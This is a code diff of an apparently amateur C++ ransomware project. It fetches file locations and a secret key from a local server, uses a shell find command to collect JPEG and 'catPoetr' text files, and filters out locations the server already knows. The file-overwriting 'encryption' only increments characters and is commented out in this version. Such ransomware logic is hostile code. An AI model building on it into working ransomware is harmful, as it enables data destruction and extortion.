@@ -3,7 +3,7 @@
 #include <fstream>
 #include <sstream>
 #include <vector>
-#include "ransomMethods.h" //TODO - leave declarations in here.
+#include "headers/ransomFunctions.h" //TODO - leave declarations in here.
 
 #include "headers/json.hpp"
 
@@ -12,35 +12,36 @@
 int main(){  
 	std::vector<std::string> fileLocationsVector;
 	std::vector<std::vector<std::string>> fileContentVector;
-	std::string serverStoredLocationsRaw = get_request("http://127.0.0.1:5000/locations");
-	std::string secretKey = get_request("http://127.0.0.1:5000/secretKey");
-	std::vector<std::string> serverLocationsVector = hackyMessJsonSanitizer(serverStoredLocationsRaw);
+	nlohmann::json j_complete = nlohmann::json::parse(get_request("http://127.0.0.1:5000/locations"));
+	std::string secretKey = get_request("http://127.0.0.1:5000/secretKey");	
     std::vector<std::string> locationsToBeEncrypted;
+    int count = 0;
 
     // TODO - recursively map directories and find in not just local directories and sub directories.
-    // Reads local directories and subdirectories and finds the precious cat poetry.
 	system("find . -type f \\( -name \"*.jpeg\" -o -name \"catPoetr*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document.    
 
 	//Reads the locations from the local fileLocation file into a string vector. Then reads contents into its own vector of string vectors.
 	bool success = getFileContents("fileLocations", fileLocationsVector);
-
-
-	nlohmann::json j_complete = nlohmann::json::parse(serverStoredLocationsRaw);
 	
-	for(auto& a : j_complete["locations"]){
-		std::cout << a["location"] << std::endl;
+	std::vector<std::string> serverLocationsVector;	
+	for(int i = 0; i < j_complete["locations"].size(); i++){
+		serverLocationsVector.push_back(j_complete["locations"][i]["location"]);
 	}
-
-
-
-/*	// TODO - Move to Function. Compares fileLocationsVector with serverStoredLocationsRaw and removes already stored locations.
-	for(int i = 0; i < fileLocationsVector.size(); i++){
+	
+	// TODO - Move to Function. Compares fileLocationsVector with serverStoredLocationsRaw and removes already stored locations.
+	for(int i = 0; i < fileLocationsVector.size(); i++){		
     	for(int j = 0; j < serverLocationsVector.size(); j++){
-    		if(fileLocationsVector[i].compare(serverLocationsVector[j]) != 0){    			
-    			locationsToBeEncrypted.push_back(fileLocationsVector[i]);
-    		}
+    		if(fileLocationsVector[i] == serverLocationsVector[j]){
+				count = count + 1;
+    			break;   			
+    		}        		
     	}
+    	if(count == 0){
+    		locationsToBeEncrypted.push_back(fileLocationsVector[i]);
+    	}
+    	count = 0;    	
     }
+   	
 
     //Reads content of each location and pushes it into a string vector which gets pushed into a vector<string::vector>.
 	if(success){ 		
@@ -55,7 +56,7 @@ int main(){
     }  
 
 
-    if(locationsToBeEncrypted.size() > 0 ){
+ /*   if(locationsToBeEncrypted.size() > 0 ){
 	 	// ENCRYPT - Basic encryption. Just increments by one. Will change for asymmetric encryption.
 		for(auto& file: fileContentVector){
 			for(auto& line : file){
@@ -76,14 +77,12 @@ int main(){
 			}
 			myFile.close();			
 		}	
-    }
-
-    for(auto& a : locationsToBeEncrypted){
-    	std::cout << a;
     }*/
 
+ 
 
 
+    // --
 
  
 
